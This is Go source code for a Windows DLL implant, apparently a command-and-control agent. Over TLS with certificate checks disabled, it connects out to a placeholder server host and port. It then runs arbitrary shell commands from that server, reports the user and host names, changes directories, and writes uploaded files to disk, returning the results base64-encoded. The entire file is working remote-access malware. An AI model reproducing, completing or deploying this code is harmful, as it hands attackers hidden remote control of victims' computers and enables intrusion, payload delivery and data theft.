//go:build windows
// +build windows,cgo

package main

import (
	"net"
	"os"
	"C"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"strconv"
	"crypto/tls"
	b64 "encoding/base64"
	) 

func com_in(conn net.Conn) string {
	println("[+] Receiving len")
    lCount := 0
	var data strings.Builder
    lenBuf := make([]byte, 1024)
    n, err := conn.Read(lenBuf)
	if err != nil {
		println("[!] Failed to receive len: ", err.Error())
		os.Exit(1) 
		}
	//println(string(lenBuf[:n]))
	lenDec := make([]byte, b64.StdEncoding.DecodedLen(len(lenBuf)))
	n,_ = b64.StdEncoding.Decode(lenDec, lenBuf)
	println("[*] Got len: ", string(lenDec[:n]))
    expectedLen,_ := strconv.Atoi(string(lenDec[:n]))
	for {
        if lCount >= expectedLen {
            break
        }
        buf := make([]byte, 1024)
        n, err := conn.Read(buf)
        if err != nil {
			println("[!] Failed to receive data: ", err.Error())
			os.Exit(1) 
			}
		dec := make([]byte, b64.StdEncoding.DecodedLen(len(buf)))
		n,_ = b64.StdEncoding.Decode(dec, buf)
        data.Write(dec[:n])
        lCount += 1024
    }
    println("[*] Got following data: " + data.String())
	return data.String()
}

// func: sending communication to client
func com_out(out string, conn net.Conn) {
	encodedOut := b64.StdEncoding.EncodeToString([]byte(out))
	weight := len(encodedOut)
	weight_int := strconv.Itoa(weight)
	println("[+] Sending len:" + weight_int)
	encodedlen := b64.StdEncoding.EncodeToString([]byte(weight_int))
	_, err := conn.Write([]byte(encodedlen)) 
	if err != nil {
		println("[!] Failed to send len: ", err.Error())
		os.Exit(1) 
		}
	println("[+] Sending b64 data:" + string(encodedOut))
	for i := 0; i < weight; i += 1024 {
		end := i + 1024
		if end > weight {
			end = weight
		}
		chunk := encodedOut[i:end]
		_, err = conn.Write([]byte(chunk))
		if err != nil {
			println("[!] Failed to send data: ", err.Error())
			os.Exit(1)
			}
		}
	println()
	}

// func : downloading a file
func receiveFile(lpath string, conn net.Conn) string {
	lfile, err := os.Create(lpath)
		if err != nil {
			println("[!] Failed to create local file: ", err.Error())
			}
	defer lfile.Close()
	println("[*] Copying file: " + lpath)
	rec := make([]byte, 1024)
	for {
		n, err := conn.Read(rec)
		if err != nil {
			println("[!] Failed to read data: ", err.Error())
			out := "Failed"
			return out
		}
		if strings.Contains(string(rec[:n]),":EOF:"){
			break
		}
		dec := make([]byte, b64.StdEncoding.DecodedLen(len(rec)))
		n,_ = b64.StdEncoding.Decode(dec, rec)
		_,err = lfile.Write(dec[:n])
		if err != nil {
			println("[!] Failed to write data: ", err.Error())
			}
		}
	println("[+] Writen into "+ lpath)
	out := "Done!"
	return out
	}

// func: executing cmd
func exec_cmd(command string) (string,error) {
	var cmd *exec.Cmd
	switch runtime.GOOS {
		case "windows":
		cmd = exec.Command("cmd", "/c", command)
		default:
		cmd = exec.Command("sh","-c", command)
		}
	output,_ := cmd.CombinedOutput()
	if len(output) == 0 {
		output = []byte("Done!")
	}
	return string(output), nil
	}
	
// func: agent
func agent(){
	const (
		HOST = "<HOST>"
		PORT = "<PORT>"
		TYPE = "tcp"
		)
		
		conf := &tls.Config{
			InsecureSkipVerify: true,
			}
		
		println("[+] Initializing TLS") 
		conn, err := tls.Dial(TYPE, HOST+":"+PORT, conf)
		if err != nil {
			println("[!] Init failed: ", err.Error())
			os.Exit(1) 
			}
		println("[+] Connected to " + HOST)
		
		for true {
			out := ""
			r := (com_in(conn))
			if strings.Split(r," ")[0] == ":user" {
				cur, err := user.Current()
				out = cur.Username
				if err != nil {
					println("[!] Failed to get username: ", err.Error())
				}
				
			} else if strings.Split(r," ")[0] == ":exit" {
				println("[+] The server killed the session")
				conn.Close()
				os.Exit(1)
				
			} else if strings.Split(r," ")[0] == ":host" {
				out, err = os.Hostname()
				if err != nil {
					println("[!] Failed to get host: ", err.Error())
				}
				
			} else if strings.Split(r," ")[0] == "cd"{
				dir := strings.Split(r," ")[1]
				os.Chdir(dir)
				out, err = os.Getwd()
				println("[+] Changing dir to: " + out)
				if err != nil {
					println("[!] Failed to change directory: ", err.Error())
				}
				
			} else if strings.Split(r," ")[0] == ":upload"{
				lpath := strings.Split(r," ")[1]
				out = receiveFile(lpath,conn)
			} else {
				out, err = exec_cmd(string(r))
			}
			com_out(out, conn)
		}
	}

//export start
func start(){
	agent()
	}
	
func main() {}
